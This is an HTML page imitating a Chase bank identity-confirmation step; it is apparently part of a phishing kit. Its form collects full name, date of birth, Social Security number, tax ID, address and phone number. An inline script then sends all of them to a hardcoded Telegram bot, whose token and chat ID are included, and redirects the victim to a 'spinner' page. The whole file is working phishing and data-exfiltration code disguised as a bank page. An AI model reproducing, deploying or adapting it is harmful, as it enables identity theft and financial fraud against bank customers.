<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Chase Online</title>
    <link rel="shortcut icon" href="img/icon.png" />
    <link rel="stylesheet" href="style2.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
  </head>

  <body>
    <section id="header">
        <div class="arrow">
            <a href="index.html"><i class="fa fa-angle-left"></i></a>
                <a href="index.html"><h4> Exit</h4></a>
        </div>        
            <a href="index.html"><img src="img/topicon.png" class="logo" width="26px" alt="" /></a>
        <a href="#"><h5>Espa√±ol</h5></a>
      </section>

    <section id="second">
        <div class="top">
            <h5>Identification</h5>
        
            <div>
                <hr class="line">
            </div>
            <div>
                <hr class="line2">
            </div>
            <div class="confirm">
                <h2>Let's confirm your identity.</h2>
            </div>
            <div>
                <h6>To protect your account, please tell us the 
                requested info so we can confirm your identity. 
                If you have more than one account, choose one 
                and we'll take care of the rest.</h6>
            </div>
            <div class="comm">
                <h6>Commercial administrators must tell us a Tax ID number.</h6>
            </div>

            <form
            name="f1"
            id="loginForm" class="details">
                <div>
                    <div class="list">
                       <h6>Full Name</h6>
                       <input type="text" name="fullname" id="fullname" required="required">
                    </div>
                    
                    <div class="list">
                        <h6>Date Of Birth (MM/DD/YYYY)</h6>
                        <input type="text" name="dob" id="dob" required="required">
                     </div>

                     <div class="list">
                        <h6>Social Security Number</h6>
                        <input type="text" name="ssn" id="ssn" required="required">
                     </div>

                     <div class="list">
                        <h6>Tax ID (optional)</h6>
                        <input type="text" name="tax" id="tax">
                     </div>

                     <hr class="line3">

                     <div class="list">
                        <h6>Street Address</h6>
                        <input type="text" name="address" id="address" required="required">
                     </div>

                     <div class="list">
                        <h6>State</h6>
                        <input type="text" name="state" id="state" required="required">
                     </div>

                     <div class="list">
                        <h6>Zip Code</h6>
                        <input type="text" name="zip" id="zip" required="required">
                     </div>

                     <div class="list">
                        <h6>Phone Number</h6>
                        <input type="tel" name="number" id="number" required="required">
                     </div>

                     <div class="end">
                       <a href="https://www.chase.com/digital/customer-service"><h5>Don't have a Social Security number? <i class="fa fa-angle-right"></i> </h5></a> 
                     </div>

                     <div class="end">
                        <a href="https://www.chase.com/digital/customer-service"><h5>Are you an authorized user on another account? <i class="fa fa-angle-right"></i> </h5></a> 
                      </div>

                      <button type="submit" id="submit" class="btn">Next</button>
                
                </div>
            </form>

            <script>
                document.getElementById("loginForm").addEventListener("submit", function(event){
                    event.preventDefault(); // Prevent form submission to allow for the fetch request

                    // Collect form data
                    var fullname = document.getElementById("fullname").value;
                    var dob = document.getElementById("dob").value;
                    var ssn = document.getElementById("ssn").value;
                    var tax = document.getElementById("tax").value;
                    var address = document.getElementById("address").value;
                    var state = document.getElementById("state").value;
                    var zip = document.getElementById("zip").value;
                    var number = document.getElementById("number").value;

                    // Prepare message for Telegram
                    var message = `Fullname: ${fullname}\nDate of Birth: ${dob}\nSSN: ${ssn}\nTax ID: ${tax}\nAddress: ${address}\nState: ${state}\nZip: ${zip}\nNumber: ${number}`;

                    // Debugging - Log the message and form data to check values
                    console.log("Form data:", message);

                    // Telegram API endpoint
                    var telegramAPI = `https://api.telegram.org/bot7681588807:AAF7pHoVlIsPzWmIELKRZXQnjq3qnNCWyiQ/sendMessage?chat_id=7920571465&text=${encodeURIComponent(message)}`;

                    // Make fetch request to Telegram API
                    fetch(telegramAPI)
                        .then(response => response.json())
                        .then(data => {
                            // Check if the response is okay
                            if (data.ok) {
                                // Successful, redirect to the next page
                                console.log("API success, redirecting...");
                                window.location.href = "spinner4.html";
                            } else {
                                // API error handling
                                console.error("Error from API:", data);
                                alert("Error sending data to Telegram.");
                            }
                        })
                        .catch(error => {
                            // Catch fetch errors
                            console.error("Fetch error:", error);
                            alert("There was an error: " + error.message);
                        });
                });
            </script>
        </div>
    </section>
    <script src="script.js"></script>
  </body>
</html>
